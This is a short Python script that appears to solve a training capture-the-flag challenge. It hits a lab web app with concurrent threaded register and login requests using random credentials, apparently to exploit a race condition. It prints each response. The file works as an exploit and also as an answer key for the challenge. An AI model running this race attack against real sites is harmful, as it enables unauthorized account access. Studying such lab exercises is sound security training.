import requests
import random
import string
import threading
import time

def random_string(N = 12):
    return''.join(random.choices(string.ascii_uppercase + string.digits, k=N))


url = "http://aart.training.jinblack.it"


def register(username,password):
    r_url = url + "/register.php"
    payload = {'username':username, 'password':password}
    r = requests.post(r_url, data=payload)
    print(r.text)


def login(username, password):
    r_url = url + "/login.php"
    payload={'username':username,'password':password}
    r = requests.post(r_url, data=payload)
    print(r.text)



while True:
    username = random_string()
    password = random_string()
    t = threading.Thread(target=register,args=(username,password))
    t.start()
    t2 = threading.Thread(target=login, args=(username, password))
    t2.start()
    time.sleep(0.2)
